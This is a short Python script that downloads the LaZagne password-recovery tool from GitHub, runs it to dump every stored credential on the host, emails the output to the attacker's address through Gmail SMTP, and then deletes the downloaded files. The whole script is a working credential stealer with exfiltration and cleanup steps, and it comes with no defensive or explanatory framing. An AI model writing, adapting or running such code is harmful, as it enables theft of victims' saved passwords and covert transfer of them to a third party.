#!usr/bin/env python

import requests
import smtplib
import subprocess
import os
import shutil
import zipfile
from env_vars import password, email

version = "2.4.2"
lazagne_version = "LaZagne-{}".format(version)


def download(url):
    file_name = url.split("/")[-1]
    get_response = requests.get(url)
    with open(file_name, "wb")as f:
        f.write(get_response.content)


def send_mail(email_, password_, message_, email_to=None):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_, password_)
    if not email_to:
        server.sendmail(email_, email_, message_)
    else:
        server.send_message(email_, email_to, message_)
    server.quit()


def if_exist(file_name):
    if os.path.exists(file_name):
        return True


def unzip_file(file_name):
    with zipfile.ZipFile(file_name, 'r') as f:
        f.extractall()


def install_requrements(system_name):
    os.chdir("{}/{}/".format(lazagne_version, system_name))
    print("[+] Wait for install requirements")
    qwe = subprocess.check_output("pip3 install -r requirement.txt", shell=True)
    print("[+] installed")


if __name__ == "__main__":
    if os.name == "nt":
        os_name = "Windows"
        if not if_exist("lazagne.exe"):
            download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe")
        command = "lazagne.exe all"

    if os.name == "posix":
        os_name = "Linux"
        zipped_file_name = "v{}.zip".format(version)
        if not if_exist(zipped_file_name):
            download("https://github.com/AlessandroZ/LaZagne/archive/{}".format(zipped_file_name))
        unzip_file(zipped_file_name)
        install_requrements(os_name)
        command = "python3 laZagne.py all"

    result = subprocess.check_output(command, shell=True)

    message = result.decode("ascii", "ignore")

    send_mail(email, password, message)


    try:
        os.remove("lazagne.exe")   
    except:
        os.chdir("../../")
        os.remove(zipped_file_name)
        shutil.rmtree(lazagne_version)


